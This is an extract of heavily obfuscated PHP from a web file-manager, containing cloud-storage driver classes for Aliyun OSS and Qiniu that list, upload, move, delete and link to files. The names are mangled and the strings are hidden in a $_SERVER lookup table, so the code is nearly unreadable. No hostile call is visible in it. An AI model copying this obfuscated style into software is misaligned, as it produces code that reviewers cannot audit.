fileOutImageServer($»æ«ìÓª, $‹àÆùŒ» = 250) { parent::fileOutImage($»æ«ìÓª, $‹àÆùŒ»); } public function fileOutLink($è™÷½®) { $™¡–²ú =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->isCdnHost() && substr($è™÷½®, 0, 7) == $™¡–²ú[313]) { $è™÷½® = $™¡–²ú[314] . substr($è™÷½®, 7); } header($™¡–²ú[175] . $è™÷½®); die; } public function hashMd5($ò¯›ïöç, $ÀæßÈÜÎ = '') { $±ûı¿° =& $_SERVER[‹è™Ü¸Ñ]; $È™¿‹ÜÛ = $this->_objectMeta($ò¯›ïöç); if (!$È™¿‹ÜÛ) { return $±ûı¿°[12]; } if (!isset($È™¿‹ÜÛ[$±ûı¿°[1458]]) && !empty($ÀæßÈÜÎ)) { $¿‚Èí‘À = $this->updateObjMeta($ò¯›ïöç, array($±ûı¿°[1458] => $ÀæßÈÜÎ)); $È™¿‹ÜÛ[$±ûı¿°[1458]] = $¿‚Èí‘À ? $ÀæßÈÜÎ : $±ûı¿°[12]; } return isset($È™¿‹ÜÛ[$±ûı¿°[1458]]) ? strtolower($È™¿‹ÜÛ[$±ûı¿°[1458]]) : $±ûı¿°[12]; } public function size($£Ò«ª¿«) { $»õ¤«÷§ = $this->objectMeta($£Ò«ª¿«); return $»õ¤«÷§ ? $»õ¤«÷§[$_SERVER[‹è™Ü¸Ñ][79]] : 0; } public function info($”õÖñö¢) { if ($this->isFolder($”õÖñö¢)) { return $this->folderInfo($”õÖñö¢); } else { if ($this->isFile($”õÖñö¢)) { return $this->fileInfo($”õÖñö¢); } } return !1; } public function exist($ˆñºÌ§) { return $this->isFile($ˆñºÌ§) || $this->isFolder($ˆñºÌ§); } public function isFile($ê¡ü©ğï) { return !$this->isFolder($ê¡ü©ğï) && $this->objectMeta($ê¡ü©ğï); } public function isFolder($áó°Ô£Û) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][179], $áó°Ô£Û); } protected function objectMeta($‚ö¯à²ô) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][181], $‚ö¯à²ô); } protected function _objectMeta($ìº¦«¿î) { $áÏÒÌúÇ =& $_SERVER[‹è™Ü¸Ñ]; try { $Úú©òúå = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ìº¦«¿î)); } catch (OSS\Core\OssException $êÕòğÇö) { $this->writeLog(__FUNCTION__ . $áÏÒÌúÇ[214] . $êÕòğÇö->getMessage()); $Úú©òúå = !1; } if ($Úú©òúå) { $Úú©òúå[$áÏÒÌúÇ[79]] = intval($Úú©òúå[$áÏÒÌúÇ[1456]]); } return $Úú©òúå; } protected function _isFolder($°ı§»Ã) { $Ñ§öŞş“ =& $_SERVER[‹è™Ü¸Ñ]; if ($°ı§»Ã == $Ñ§öŞş“[12] || $°ı§»Ã == $Ñ§öŞş“[8]) { return !0; } $Å¯ŒÍ¨š = array($Ñ§öŞş“[1451] => $Ñ§öŞş“[8], $Ñ§öŞş“[1452] => rtrim($°ı§»Ã, $Ñ§öŞş“[8]) . $Ñ§öŞş“[8], $Ñ§öŞş“[1453] => 1, $Ñ§öŞş“[1454] => $Ñ§öŞş“[12]); $´¾¦˜Œ² = $this->client->listObjects($this->bucket, $Å¯ŒÍ¨š); if ($´¾¦˜Œ²->getObjectList() || $´¾¦˜Œ²->getPrefixList()) { return !0; } return !1; } public function writeLog($×¿±«Šæ = '', $Ÿ÷ÅÚ€ = false) { $¡ª˜¢Ğ =& $_SERVER[‹è™Ü¸Ñ]; $¡ ×êË = in_array(ACTION, array($¡ª˜¢Ğ[212], $¡ª˜¢Ğ[213])); if (!$¡ ×êË && !GLOBAL_DEBUG) { return; } $ÑÉø¬ Ñ = 0; if (stripos($×¿±«Šæ, $¡ª˜¢Ğ[1478]) !== !1) { $ÑÉø¬ Ñ = 1; $±êçğáÂ = explode($¡ª˜¢Ğ[1479], $×¿±«Šæ); $×¿±«Šæ = !empty($±êçğáÂ[1]) ? $±êçğáÂ[1] : $×¿±«Šæ; } else { if (stripos($×¿±«Šæ, $¡ª˜¢Ğ[1480])) { $ÑÉø¬ Ñ = 2; $±êçğáÂ = explode($¡ª˜¢Ğ[1480], $×¿±«Šæ); $±êçğáÂ = explode($¡ª˜¢Ğ[4], $±êçğáÂ[0]); $×¿±«Šæ = !empty($±êçğáÂ[1]) ? $±êçğáÂ[1] : $×¿±«Šæ; } } if ($¡ ×êË && I18n::getType() == $¡ª˜¢Ğ[1481]) { if ($ÑÉø¬ Ñ == 1) { $×¿±«Šæ = str_replace($¡ª˜¢Ğ[1482], $¡ª˜¢Ğ[1483], $×¿±«Šæ); } else { if ($ÑÉø¬ Ñ == 2) { $±êçğáÂ = explode($¡ª˜¢Ğ[214], $±êçğáÂ[0]); $ˆØñÜúå = isset($±êçğáÂ[1]) ? $±êçğáÂ[1] : $¡ª˜¢Ğ[12]; $ªæÌ á˜ = array($¡ª˜¢Ğ[1484] => $¡ª˜¢Ğ[1485], $¡ª˜¢Ğ[1486] => $¡ª˜¢Ğ[1487], $¡ª˜¢Ğ[1488] => $¡ª˜¢Ğ[1489], $¡ª˜¢Ğ[1490] => $¡ª˜¢Ğ[1491], $¡ª˜¢Ğ[1492] => $¡ª˜¢Ğ[1493], $¡ª˜¢Ğ[1494] => $¡ª˜¢Ğ[1495], $¡ª˜¢Ğ[1496] => $¡ª˜¢Ğ[1497], $¡ª˜¢Ğ[1498] => $¡ª˜¢Ğ[1499], $¡ª˜¢Ğ[1500] => $¡ª˜¢Ğ[1501], $¡ª˜¢Ğ[1502] => $¡ª˜¢Ğ[1503]); if (isset($ªæÌ á˜[$ˆØñÜúå])) { $×¿±«Šæ = $ªæÌ á˜[$ˆØñÜúå]; } } } if (stripos($×¿±«Šæ, $¡ª˜¢Ğ[1504])) { $×¿±«Šæ = $¡ª˜¢Ğ[1505]; } } if (!trim($×¿±«Šæ)) { return; } parent::writeLog(trim($×¿±«Šæ), $Ÿ÷ÅÚ€); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ªú²’÷Ğ) { parent::__construct(); require_once SDK_DIR . $_SERVER[‹è™Ü¸Ñ][1506]; $this->_init($ªú²’÷Ğ); } public function _init($õÚ­è­Æ) { $Ç¦ùş¥Ó =& $_SERVER[‹è™Ü¸Ñ]; $this->config = $õÚ­è­Æ; foreach ($õÚ­è­Æ as $ŸÆ½©° => $ÁëîÈ‰Ò) { if (isset($this->{$ŸÆ½©°})) { $this->{$ŸÆ½©°} = $ÁëîÈ‰Ò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ç¦ùş¥Ó[1507] . LNG($Ç¦ùş¥Ó[1442])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($†‰´ÁÒ, $Š†«¨°ù = '', $‡»ì­Óµ = REPEAT_RENAME) { if ($this->setContent($†‰´ÁÒ, $Š†«¨°ù)) { return $this->getPathOuter($†‰´ÁÒ); } return !1; } public function mkdir($²´ÃÒ•é, $˜ïÁÔç = REPEAT_SKIP) { $Ú‡ËÖÈ =& $_SERVER[‹è™Ü¸Ñ]; $æ€‰·Ò¹ = trim($²´ÃÒ•é, $Ú‡ËÖÈ[8]); if ($this->_isFolder($æ€‰·Ò¹)) { return $this->getPathOuter($æ€‰·Ò¹); } $²´ÃÒ•é = $æ€‰·Ò¹ . $Ú‡ËÖÈ[8]; $—ôËà¿Ú = get_path_this($æ€‰·Ò¹); $ÈßÌÒÉŞ = $²´ÃÒ•é . $—ôËà¿Ú; if (!$this->mkfile($ÈßÌÒÉŞ)) { return !1; } if (!$this->moveFile($ÈßÌÒÉŞ, $²´ÃÒ•é)) { $this->delFile($ÈßÌÒÉŞ); return !1; } return $this->getPathOuter($æ€‰·Ò¹); } public function copyFile($öòÈÒÑß, $µ¦ì¬÷‘) { $àíÎ¤Î² = $this->bucketManager->copy($this->bucket, $öòÈÒÑß, $this->bucket, $µ¦ì¬÷‘, !0); return $àíÎ¤Î² ? !1 : $this->getPathOuter($µ¦ì¬÷‘); } public function moveFile($Œ½„„ÎÍ, $‡óçÅ˜á) { $û‚¤ãÌÂ = $this->bucketManager->move($this->bucket, $Œ½„„ÎÍ, $this->bucket, $‡óçÅ˜á, !0); return $û‚¤ãÌÂ ? !1 : $this->getPathOuter($‡óçÅ˜á); } public function delFile($–îáã¾µ) { if (!$this->exist($–îáã¾µ)) { return !0; } $¨çÕ³á‘ = $this->bucketManager->delete($this->bucket, $–îáã¾µ); return $¨çÕ³á‘ ? !1 : !0; } public function delFolder($ò· ¥±æ) { $šË³¬‰¨ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->exist($ò· ¥±æ)) { return !0; } $this->listItemCache = !1; $ãÀ€ó‚÷ = $this->fileList($ò· ¥±æ); $this->listItemCache = !0; $Ò—Üü = trim($ò· ¥±æ, $šË³¬‰¨[8]) . $šË³¬‰¨[8]; if (!empty($ò· ¥±æ) && $ò· ¥±æ !== $šË³¬‰¨[228] && !in_array($Ò—Üü, $ãÀ€ó‚÷[$šË³¬‰¨[85]])) { $ãÀ€ó‚÷[$šË³¬‰¨[85]][] = $Ò—Üü; } $‘—Îùâ¨ = $this->delByBatch($ãÀ€ó‚÷[$šË³¬‰¨[86]]); if (!$‘—Îùâ¨) { return !1; } $‘—Îùâ¨ = $this->delByBatch($ãÀ€ó‚÷[$šË³¬‰¨[85]]); if (!$‘—Îùâ¨) { return !1; } return $this->delFile($Ò—Üü); } private function delByBatch($ˆ…œúİ) { foreach (array_chunk($ˆ…œúİ, 1000) as $…—úåõê) { $ÉØ²Ùä½ = $this->bucketManager->buildBatchDelete($this->bucket, $…—úåõê); list($°‚œ¹–½, $Ò¶ü™òÓ) = $this->bucketManager->batch($ÉØ²Ùä½); if ($Ò¶ü™òÓ) { return !1; } } return !0; } public function rename($¬¡µ½×€, $éÜ°½÷¤) { return $this->renameObject($¬¡µ½×€, $éÜ°½÷¤); } public function fileInfo($ÛÓÍ”ğÌ, $»„£ĞÁƒ = false, $¸¢ëíÅì = array()) { $İ‰ÓÛÕ =& $_SERVER[‹è™Ü¸Ñ]; $Ñ†ªè™Á = array($İ‰ÓÛÕ[32] => $this->pathThis($ÛÓÍ”ğÌ), $İ‰ÓÛÕ[87] => $this->getPathOuter($İ‰ÓÛÕ[8] . $ÛÓÍ”ğÌ), $İ‰ÓÛÕ[33] => $İ‰ÓÛÕ[230], $İ‰ÓÛÕ[79] => isset($¸¢ëíÅì[$İ‰ÓÛÕ[1508]]) ? $¸¢ëíÅì[$İ‰ÓÛÕ[1508]] : 0, $İ‰ÓÛÕ[169] => $this->ext($ÛÓÍ”ğÌ)); if ($»„£ĞÁƒ) { return $Ñ†ªè™Á; } $Ñ†ªè™Á[$İ‰ÓÛÕ[231]] = $Ñ†ªè™Á[$İ‰ÓÛÕ[88]] = 0; $Ñ†ªè™Á[$İ‰ÓÛÕ[232]] = $Ñ†ªè™Á[$İ‰ÓÛÕ[233]] = !0; if (empty($¸¢ëíÅì)) { $¸¢ëíÅì = $this->objectMeta($ÛÓÍ”ğÌ); if (!$¸¢ëíÅì) { return $Ñ†ªè™Á; } } if (isset($¸¢ëíÅì[$İ‰ÓÛÕ[234]]) && $¸¢ëíÅì[$İ‰ÓÛÕ[234]]) { $Ñ†ªè™Á[$İ‰ÓÛÕ[235]] = $¸¢ëíÅì[$İ‰ÓÛÕ[234]]; } if (isset($¸¢ëíÅì[$İ‰ÓÛÕ[245]]) && $¸¢ëíÅì[$İ‰ÓÛÕ[245]]) { $Ñ†ªè™Á[$İ‰ÓÛÕ[235]] = $¸¢ëíÅì[$İ‰ÓÛÕ[245]]; } if (isset($¸¢ëíÅì[$İ‰ÓÛÕ[1509]])) { $Ñ†ªè™Á[$İ‰ÓÛÕ[88]] = substr($¸¢ëíÅì[$İ‰ÓÛÕ[1509]] . $İ‰ÓÛÕ[12], 0, 10); } if (isset($¸¢ëíÅì[$İ‰ÓÛÕ[1508]])) { $Ñ†ªè™Á[$İ‰ÓÛÕ[79]] = $¸¢ëíÅì[$İ‰ÓÛÕ[1508]]; } return $Ñ†ªè™Á; } public function folderInfo($Ç¯ûâ—–, $¾†¹ç‡ = false) { $­Ìø× =& $_SERVER[‹è™Ü¸Ñ]; $ì²øº Ş = array($­Ìø×[32] => $this->pathThis($Ç¯ûâ—–), $­Ìø×[87] => $this->getPathOuter($­Ìø×[8] . $Ç¯ûâ—–), $­Ìø×[33] => $­Ìø×[78]); if ($¾†¹ç‡) { return $ì²øº Ş; } $ì²øº Ş[$­Ìø×[231]] = $ì²øº Ş[$­Ìø×[88]] = 0; $ì²øº Ş[$­Ìø×[232]] = $ì²øº Ş[$­Ìø×[233]] = !0; $Ç¯ûâ—– = rtrim($Ç¯ûâ—–, $­Ìø×[8]) . $­Ìø×[8]; $”¯¨Ëñë = $this->objectMeta($Ç¯ûâ—–); if (isset($”¯¨Ëñë[$­Ìø×[1509]])) { $ì²øº Ş[$­Ìø×[88]] = substr($”¯¨Ëñë[$­Ìø×[1509]] . $­Ìø×[12], 0, 10); } return $ì²øº Ş; } public function listPath($œ“Ä“Ë, $ËÓî€ÏŞ = false) { $ñÈÑì¢ =& $_SERVER[‹è™Ü¸Ñ]; $‚ßşòêÏ = $this->fileList($œ“Ä“Ë, $ñÈÑì¢[8], !0); foreach ($‚ßşòêÏ[$ñÈÑì¢[85]] as $°ı¬üÅ§ => $é¨®¢˜) { $‚ßşòêÏ[$ñÈÑì¢[85]][$°ı¬üÅ§] = $this->folderInfo($é¨®¢˜, $ËÓî€ÏŞ); } foreach ($‚ßşòêÏ[$ñÈÑì¢[86]] as $°ı¬üÅ§ => $é¨®¢˜) { $‚ßşòêÏ[$ñÈÑì¢[86]][$°ı¬üÅ§] = $this->fileInfo($é¨®¢˜[$ñÈÑì¢[97]], $ËÓî€ÏŞ, $é¨®¢˜); } return $‚ßşòêÏ; } public function has($í§á´Š, $áö²ÓûÁ = false, $À‘€Ö¡ = true) { $ø‰ÍéÔ² =& $_SERVER[‹è™Ü¸Ñ]; $í§á´Š = trim($í§á´Š, $ø‰ÍéÔ²[8]); $ïËŠ‡­Á = empty($í§á´Š) && $í§á´Š !== $ø‰ÍéÔ²[228] ? $ø‰ÍéÔ²[12] : $í§á´Š . $ø‰ÍéÔ²[8]; $ü€ßÙü¶ = $ø‰ÍéÔ²[12]; $¿Îú¨íä = 500; $öÁ°£»ó = $ø‰ÍéÔ²[8]; $¦‡¾™×È = $å£Í’­Ş = 0; while (!0) { check_abort(); list($‚Ñ£•à, $³ÑÙ×·ã) = $this->bucketManager->listFiles($this->bucket, $ïËŠ‡­Á, $ü€ßÙü¶, $¿Îú¨íä, $öÁ°£»ó); if ($³ÑÙ×·ã) { break; } $ü€ßÙü¶ = array_key_exists($ø‰ÍéÔ²[1454], $‚Ñ£•à) ? $ü€ßÙü¶ = $‚Ñ£•à[$ø‰ÍéÔ²[1510]] : $ø‰ÍéÔ²[12]; if ($áö²ÓûÁ) { if (!empty($‚Ñ£•à[$ø‰ÍéÔ²[1511]])) { $¦‡¾™×È += count($‚Ñ£•à[$ø‰ÍéÔ²[1511]]); } if (!empty($‚Ñ£•à[$ø‰ÍéÔ²[1512]])) { $å£Í’­Ş += count($‚Ñ£•à[$ø‰ÍéÔ²[1512]]); } if ($ü€ßÙü¶ === $ø‰ÍéÔ²[12]) { break; } continue; } if ($À‘€Ö¡) { if (!empty($‚Ñ£•à[$ø‰ÍéÔ²[1511]])) { return !0; } } else { if (!empty($‚Ñ£•à[$ø‰ÍéÔ²[1512]])) { return !0; } } if ($ü€ßÙü¶ === $ø‰ÍéÔ²[12]) { break; } } if ($áö²ÓûÁ) { return array($ø‰ÍéÔ²[239] => $¦‡¾™×È, $ø‰ÍéÔ²[240] => $å£Í’­Ş); } return !1; } public function listAll($œÊ†ª) { $€úÕÖ‚ =& $_SERVER[‹è™Ü¸Ñ]; $¸ê½©Í— = $this->fileList($œÊ†ª, $€úÕÖ‚[12], !0); $³Ù‚£ª‡ = array_to_keyvalue($¸ê½©Í—[$€úÕÖ‚[86]], $€úÕÖ‚[32]); foreach ($¸ê½©Í—[$€úÕÖ‚[85]] as $‘Ë¿¬”) { if (is_string($‘Ë¿¬”)) { $³Ù‚£ª‡[$‘Ë¿¬”] = array($€úÕÖ‚[79] => 0); } } return $this->listAllFiles($œÊ†ª, $³Ù‚£ª‡); } private function fileList($ö©¡şËÎ, $ ôÆ² = '', $ƒÖÎœ‰Å = 0) { $¼°İâò½ =& $_SERVER[‹è™Ü¸Ñ]; $ö©¡şËÎ = trim($ö©¡şËÎ, $¼°İâò½[8]); $ï¢çµ = empty($ö©¡şËÎ) && $ö©¡şËÎ !== $¼°İâò½[228] ? $¼°İâò½[12] : $ö©¡şËÎ . $¼°İâò½[8]; $¾áêÎ« = $¼°İâò½[12]; $Ÿ÷Ù“‰ß = 1000; $ıÃÛåÇ = $¥¥µÎ¤… = array(); while (!0) { check_abort(); list($ıöÙÏ—è, $ ôÕÁÀ) = $this->bucketManager->listFiles($this->bucket, $ï¢çµ, $¾áêÎ«, $Ÿ÷Ù“‰ß, $ ôÆ²); if ($ ôÕÁÀ) { break; } $¾áêÎ« = array_key_exists($¼°İâò½[1454], $ıöÙÏ—è) ? $¾áêÎ« = $ıöÙÏ—è[$¼°İâò½[1510]] : $¼°İâò½[12]; $íâ‘éáè = isset($ıöÙÏ—è[$¼°İâò½[1511]]) ? $ıöÙÏ—è[$¼°İâò½[1511]] : array(); $•»ìôÊ‘ = isset($ıöÙÏ—è[$¼°İâò½[1512]]) ? $ıöÙÏ—è[$¼°İâò½[1512]] : array(); foreach ($íâ‘éáè as $Ş×¼ÚÇÕ) { if ($Ş×¼ÚÇÕ[$¼°İâò½[97]] == $ï¢çµ) { continue; } $˜ıÛØÑ = $Ş×¼ÚÇÕ[$¼°İâò½[97]]; $‘äÎ¥Ì = $Ş×¼ÚÇÕ[$¼°İâò½[1508]]; $Ş×¼ÚÇÕ[$¼°İâò½[79]] = $‘äÎ¥Ì; $¸åíé“³ = $‘äÎ¥Ì == 0 && substr($˜ıÛØÑ, strlen($˜ıÛØÑ) - 1, 1) == $¼°İâò½[8] ? !0 : !1; $this->cacheMethodInfoSet($˜ıÛØÑ, $¸åíé“³, $Ş×¼ÚÇÕ); if ($¸åíé“³) { $ıÃÛåÇ[] = $˜ıÛØÑ; continue; } $¥¥µÎ¤…[] = $ƒÖÎœ‰Å ? $Ş×¼ÚÇÕ : $˜ıÛØÑ; } foreach ($•»ìôÊ‘ as $˜ıÛØÑ) { if ($˜ıÛØÑ == $ï¢çµ) { continue; } $ıÃÛåÇ[] = $˜ıÛØÑ; $this->cacheMethodInfoSet($˜ıÛØÑ, !0); } if ($¾áêÎ« === $¼°İâò½[12]) { break; } } $this->cacheMethodInfoSet($ö©¡şËÎ, !0); return array($¼°İâò½[85] => $ıÃÛåÇ, $¼°İâò½[86] => $¥¥µÎ¤…); } public function canRead($’æÈÔİ¸) { return $this->exist($’æÈÔİ¸) ? !0 : !1; } public function canWrite($Ø¥ÈÄíç) { return $this->exist($Ø¥ÈÄíç) ? !0 : !1; } public function getContent($øç‰Ş„) { return $this->fileSubstr($øç‰Ş„, 0, -1); } public function setContent($Ôş¦ŒÅ±, $ºÙÃ±Ë = '') { $³ËÑò‰ = $this->tempFile($this->pathThis($Ôş¦ŒÅ±)); file_put_contents($³ËÑò‰, $ºÙÃ±Ë); if ($this->upload($Ôş¦ŒÅ±, $³ËÑò‰)) { $this->tempFileRemve($³ËÑò‰); return !0; } return !1; } public function refreshUrls($«á¾ ŞÕ) { $Ğéø¼‰ =& $_SERVER[‹è™Ü¸Ñ]; $íî¼ó¦Ä = array(); if (is_array($«á¾ ŞÕ)) { foreach ($«á¾ ŞÕ as $·ÊÏ«²„) { $íî¼ó¦Ä[] = $this->link($·ÊÏ«²„); } } else { $íî¼ó¦Ä[] = $this->link($«á¾ ŞÕ); } $ë”şæ©÷ = new Qiniu\Cdn\CdnManager($this->auth); list($ˆáãÜÙ®, $Œ÷õú¶’) = $ë”şæ©÷->refreshUrls($íî¼ó¦Ä); if ($Œ÷õú¶’) { return !1; } return $ˆáãÜÙ®[$Ğéø¼‰[1244]] == $Ğéø¼‰[814] ? !0 : !1; } public function fileSubstr($ÛÛ†Î Ä, $Ûäïû¹ô, $ü€†í‚›) { $é¡›¡äÀ =& $_SERVER[‹è™Ü¸Ñ]; if (!($ÑÌòˆ×Î = $this->link($ÛÛ†Î Ä))) { return !1; } $èÔ¦ßäß = !1; if ($ü€†í‚› > 0) { $¿ÕÇøÎ = $Ûäïû¹ô + $ü€†í‚› - 1; $èÔ¦ßäß = array($é¡›¡äÀ[1513] . $Ûäïû¹ô . $é¡›¡äÀ[462] . $¿ÕÇøÎ); } $µ‹¡º• = url_request($ÑÌòˆ×Î, $é¡›¡äÀ[261], !1, $èÔ¦ßäß); return $µ‹¡º•[$é¡›¡äÀ[805]] ? $µ‹¡º•[$é¡›¡äÀ[1267]] : !1; } public function upload($üı·¥‚¸, $àòÎ·è, $Øéˆ¸€Ä = false, $úé˜êÅ = REPEAT_REPLACE) { $Çëª¡¸¯ = new Qiniu\Storage\UploadManager(); $€¢©Á÷å = $this->auth->uploadToken($this->bucket, $üı·¥‚¸); $†ıÖ”ÁÁ = get_file_mime(get_path_ext($àòÎ·è)); list($ÄÚ•æ–ş, $éÙí˜¿ê) = $Çëª¡¸¯->putFile($€¢©Á÷å, $üı·¥‚¸, $àòÎ·è, null, $†ıÖ”ÁÁ); return $éÙí˜¿ê ? !1 : $this->getPathOuter($üı·¥‚¸); } public function uploadFormData($ù²ÎÀá›, $ŠËßå‹€ = 3600) { return $this->uploadToken($ù²ÎÀá›, $ŠËßå‹€); } public function multiUploadFormData($»úÕªâî, $ÇƒïŸäÁ = 3600) { return $this->uploadToken($»úÕªâî, $ÇƒïŸäÁ); } private function uploadToken($¬”ßäæ, $±º¹ñ² = 3600) { $‚ì¯ã‚ú =& $_SERVER[‹è™Ü¸Ñ]; $‹´Ì¶¸ = $±º¹ñ²; $Š‰œ±¹Ï = array($‚ì¯ã‚ú[1514] => $‚ì¯ã‚ú[1515]); $´ÜèÍü» = $¬”ßäæ; $„â¼É¸ö = $this->auth->uploadToken($this->bucket, $´ÜèÍü», $‹´Ì¶¸, $Š‰œ±¹Ï, !0); $ÛğÉ…®Ş = empty($this->region) || $this->region == $‚ì¯ã‚ú[1516] ? $‚ì¯ã‚ú[12] : $‚ì¯ã‚ú[462] . $this->region; $î¸áìËş = http_type() . "\72\57\x2f\x75\x70\154\x6f\141\x64{$ÛğÉ…®Ş}\56\161\x69\156\151\165\x70\x2e\x63\x6f\155\x2f"; return array($‚ì¯ã‚ú[1517] => $„â¼É¸ö, $‚ì¯ã‚ú[1518] => $î¸áìËş); } public function download($¥Ö‡ô×Õ, $ĞÈíŸ‡) { $¯•ÇœÆ¡ = IO::getPathInner(IO::mkfile($ĞÈíŸ‡)); if (!($ ¿é»Ù­ = $this->link($¥Ö‡ô×Õ))) { return !1; } $…íâø¡ã = 0; $‡ÅÌÉı = 1024 * 200; $ñÄ¸·ã = fopen($¯•ÇœÆ¡, $_SERVER[‹è™Ü¸Ñ][1519]); while (!0) { $úÖôñ‡Ó = $this->fileSubstr($¥Ö‡ô×Õ, $…íâø¡ã, $‡ÅÌÉı); if ($úÖôñ‡Ó === !1) { return !1; } fwrite($ñÄ¸·ã, $úÖôñ‡Ó); $…íâø¡ã += $‡ÅÌÉı; if (strlen($úÖôñ‡Ó) < $‡ÅÌÉı) { break; } } fclose($ñÄ¸·ã); return $ĞÈíŸ‡; } public function link($Ïë»…¦É, $š±´¬µ› = '') { if (!$this->isFile($Ïë»…¦É)) { return !1; } $ÂÍŸ©€‡ = $this->getHost() . $_SERVER[‹è™Ü¸Ñ][8] . $this->pathEncode($Ïë»…¦É) . $š±´¬µ›; return $this->auth->privateDownloadUrl($ÂÍŸ©€‡, 3600 * 12); } public function fileOut($±Š·ªº, $ù•ıµ = false, $¤ôàµûğ = false, $úáÒ–ĞÁ = '') { $Å˜í¼¦ß =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($±Š·ªº, $ù•ıµ, $¤ôàµûğ, $úáÒ–ĞÁ); } if (!$¤ôàµûğ) { $¤ôàµûğ = $this->pathThis($±Š·ªº); } $óˆæ¯® = $ù•ıµ ? $Å˜í¼¦ß[1520] . rawurlencode($¤ôàµûğ) : $Å˜í¼¦ß[12]; $äŞóõ« = $this->link($±Š·ªº, $óˆæ¯®); $this->fileOutLink($äŞóõ«); } public function fileOutServer($›İœ”¦‚, $ˆ ™Ğó‹ = false, $Š‰ş €Ú = false, $í¶Ô‘’ = '') { parent::fileOut($›İœ”¦‚, $ˆ ™Ğó‹, $Š‰ş €Ú, $í¶Ô‘’); } public function fileOutImage($ìó¾İ¬±, $åñ»‰¼Ï = 250) { if ($this->size($ìó¾İ¬±) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ìó¾İ¬±, $åñ»‰¼Ï); } $«¡º‚ƒ = $this->link($ìó¾İ¬±, $_SERVER[‹è™Ü¸Ñ][1521] . $åñ»‰¼Ï); $this->fileOutLink($«¡º‚ƒ); } public function fileOutImageServer($şÀ’¢Õ, $äºı‹Ô = 250) { parent::fileOutImage($şÀ’¢Õ, $äºı‹Ô); } public function hashMd5($³ü“„ê) { $Ïá€û·¬ =& $_SERVER[‹è™Ü¸Ñ]; $æÂ«ø°Õ = $this->objectMeta($³ü“„ê); return isset($æÂ«ø°Õ[$Ïá€û·¬[245]]) ? $æÂ«ø°Õ[$Ïá€û·¬[245]] : !1; $Í¨ÙÊ‰ñ = $this->link($³ü“„ê, $Ïá€û·¬[1522]); } public function size($«éãÏ) { $ô©ÍŞà™ = $this->objectMeta($«éãÏ); return $ô©ÍŞà™ ? $ô©ÍŞà™[$_SERVER[‹è™Ü¸Ñ][79]] : 0; } public function info($Ò¸Ø°¥ò) { if ($this->isFolder($Ò¸Ø°¥ò)) { return $this->folderInfo($Ò¸Ø°¥ò); } else { if ($this->isFile($Ò¸Ø°¥ò)) { return $this->fileInfo($Ò¸Ø°¥ò); } } return !1; } public function exist($ş®Ğ²Ü½) { return $this->isFile($ş®Ğ²Ü½) || $this->isFolder($ş®Ğ²Ü½); } public function isFile($’«œ¹÷) { return !$this->isFolder($’«œ¹÷) && $this->objectMeta($’«œ¹÷); } public function isFolder($±”áŒ) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][179], $±”áŒ); } protected function objectMeta($÷„ñá–ù) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][181], $÷„ñá–ù); } protected function _objectMeta($±íÖÛŞ÷) { $·—·§Ç† =& $_SERVER[‹è™Ü¸Ñ]; list($–®‹å¸, $ÍÍÓ÷Å®) = $this->bucketManager->stat($this->bucket, $±íÖÛŞ÷); if ($–®‹å¸) { $–®‹å¸[$·—·§Ç†[79]] = intval($–®‹å¸[$·—·§Ç†[1508]]); } return $–®‹å¸; } protected function _isFolder($„ Ìœˆ) { $„úî†î =& $_SERVER[‹è™Ü¸Ñ]; if ($„ Ìœˆ == $„úî†î[12] || $„ Ìœˆ == $„úî†î[8]) { return !0; } list($éã²µƒ, $§Ì×í¥) = $this->bucketManager->listFiles($this->bucket, trim($„ Ìœˆ, $„úî†î[8]) . $„úî†î[8], $„úî†î[12], 1, $„úî†î[8]); return !empty($éã²µƒ[$„úî†î[1511]]) || !empty($éã²µƒ[$„úî†î[1512]]) ? !0 : !1; } } goto D×ŒÁïÊŒ™; fŒ¹¡©õ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬˜ÊŠÂ‘ =& $_SERVER[‹è™Ü¸Ñ]; $this->objectDriver = array($¬˜ÊŠÂ‘[60], $¬˜ÊŠÂ‘[61], $¬˜ÊŠÂ‘[62], $¬˜ÊŠÂ‘[63], $¬˜ÊŠÂ‘[64], $¬˜ÊŠÂ‘[65], $¬˜ÊŠÂ‘[66], $¬˜ÊŠÂ‘[67], $¬˜ÊŠÂ‘[68], $¬˜ÊŠÂ‘[69], $¬˜ÊŠÂ‘[70], $¬˜ÊŠÂ‘[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($’š¶¼çá) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($’š¶¼çá, $_SERVER[‹è™Ü¸Ñ][8]); } return $’š¶¼çá; } public function iconvApp($Ò±×ıˆŒ) { return $Ò±×ıˆŒ; } public function iconvSystem($“•µóê) { return $“•µóê; } public function iconvTo($Á¬Àâá, $•˜–İŞ¬, $ïÜûîÒç) { $Ê¹à‰É… =& $_SERVER[‹è™Ü¸Ñ]; if (!$Á¬Àâá || !function_exists($Ê¹à‰É…[72])) { return $Á¬Àâá; } static $õó„Å æ = array(); $Âù›äë“ = $•˜–İŞ¬ . $Ê¹à‰É…[73] . $ïÜûîÒç . $Ê¹à‰É…[74] . $Á¬Àâá; if (isset($õó„Å æ[$Âù›äë“])) { return $õó„Å æ[$Âù›äë“]; } if (function_exists($Ê¹à‰É…[75])) { $ÏÜç‚áò = @mb_convert_encoding($Á¬Àâá, 